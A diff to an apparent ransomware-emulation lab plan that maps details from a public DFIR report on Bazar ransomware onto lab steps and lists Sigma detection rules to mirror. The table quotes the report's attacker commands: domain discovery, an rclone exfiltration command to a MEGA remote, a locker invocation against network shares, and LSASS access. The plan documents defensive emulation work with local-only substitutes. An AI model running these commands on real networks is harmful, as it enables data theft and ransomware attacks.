@@ -177,3 +177,27 @@ extend the existing S1–S9 mapping with S10–S15 rows.
 - AnyDesk-like/remote sessions lab-local; public relay never used as C2.
 - Secrets never in command lines, files, or logs (operator-facing passwords at prompts or
   DPAPI clixml under `stage/`, gitignored).
+## 7. DFIR report cross-check (full text verified 2026-10-02 — https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/)
+
+The plan above was cross-checked against the original report text (fetched 2026-10-02; the
+lab scheme already mirrored the key chain). Exact report details now pinned into the plan:
+
+| Report detail | Lab mapping | Notes |
+|---|---|---|
+| Discovery set: `tasklist /s`, `net group "domain admins" /dom`, `net localgroup "administrator"`, `nltest /domain_trusts /all_trusts`, `net view /all /domain`, `net view /all time`, `ping` | **identical** to `scripts/runbooks/c0015-phase2.json` (S4) | runbook was derived from this exact list — correlation preserved |
+| ShareFinder → `c:\ProgramData\found_shares.txt` | S5 writes `found_shares.txt` to `C:\ProgramData` (already) | name/path parity |
+| WMI invoking Rundll32 to load **143.dll** on the target | S8b `wmiprvse→rundll32→c0015_143_surrogate.dll` (space-form fix) | parity via ART-06-01 hash |
+| **Rclone** exfil: `rclone.exe copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`; two rounds (19-22 UTC day1/day4) | **REAL rclone** (open-source, official release) with the SAME parameters, remote = **LOCAL** (`sink` configured as rclone `local` or a local WebDAV endpoint on the C2 host feeding `stage/sink/<run>/round<N>`) | keeps the exact tool + CLI (E1/E11 + detection per NCC rclone guidance) with zero public cloud; **no MEGA credentials/API needed** |
+| AnyDesk portable under `c:\users\<REDACTED>\Videos` (day 5) | AnyDesk-like = **RustDesk portable** (open-source) in `C:\Users\Public\Videos\` + **self-hosted relay on the C2 host** (hbbs/hbbr) | T1219.002 telemetry without public relay; real AnyDesk rejected (its relay connects to public infrastructure — violates the no-public-relay boundary) |
+| ProcessHacker dropped at `C:\` root; used for LSASS | **ProcessHacker2 portable** at `C:\` root during S13; open LSASS handle **minimal access only (E10, no dump / no credential read)** | E10 source picture stays; run notes record "no dump" |
+| `locker.bat` → `_locker.exe -m -net -size 10 -nomutex -p \\HOST\C$` + `readme.txt` note + post-impact file listing | S14 surrogate (`c0015_impact.ps1`) mirrors: bulk file transform + note + `Verify` (T1083 listing) + Rollback | bounded, reversible, allowlist corpus |
+| Operators never interacted with DCs | Lab keeps DC01 telemetry-only (unchanged) | boundary |
+| RDP day 2 via the beacon + backup console + taskmanager GUI (`/4`) | S12 RDP `it.admin` + audit; note the taskmgr `/4` observation as optional S13 nuance (open `taskmgr.exe /4` once for parent/child telemetry) | optional |
+
+Sigma rules from the report worth mirroring in later rule work: `win_susp_wmic_proc_create_rundll32`,
+`sysmon_rundll32_net_connections`, `rclone_execution`, `sysmon_abusing_debug_privilege`,
+`win_mshta_spawn_shell`, `win_susp_net_execution` — our R01-R18 already cover several; document
+mapping in a follow-up.
+
+Decisions (operator-approved): rclone→local sink (rev 1), RustDesk+local relay (AnyDesk-like),
+ProcessHacker E10-no-dump. No external credentials are required for the final campaign.
